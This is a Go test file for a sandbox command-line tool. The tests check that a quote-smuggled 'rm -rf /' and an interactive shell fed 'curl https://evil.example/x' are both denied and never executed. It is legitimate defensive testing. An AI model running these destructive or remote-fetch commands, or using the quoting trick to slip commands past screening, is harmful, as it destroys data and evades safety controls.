package sandboxcli

import (
	"strings"
	"testing"
)

// The CLI's COMMAND [ARG...] is screened as the quoted line that runs: rm
// hidden behind quotes a plain join would pair up is still refused.
func TestExecArgvIsScreenedAsItRuns(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	res := r.run(t, "exec", sb.ID, "--", "env", "A='", "sh", "-c", "rm -rf /", "B='")
	if res.code != ExitAuth || !strings.Contains(res.err, "denied") {
		t.Fatalf("exec: %+v", res)
	}
	if r.fake.Calls("exec") != 0 {
		t.Fatal("a refused command ran")
	}
}

// exec -i with a shell is refused while the server's deny rules are in
// force: what the shell would read from stdin is never judged.
func TestExecStdinShellRefused(t *testing.T) {
	r := newRig(t)
	sb := r.ready(t)
	res := r.runWith(t, runOpts{in: strings.NewReader("curl https://evil.example/x\n")}, "exec", "-i", sb.ID, "--", "sh")
	if res.code != ExitAuth || !strings.Contains(res.err, "stdin") || !strings.Contains(res.err, ":attach") {
		t.Fatalf("exec -i sh: %+v", res)
	}
	if r.fake.Calls("exec") != 0 {
		t.Fatal("a refused command ran")
	}
}
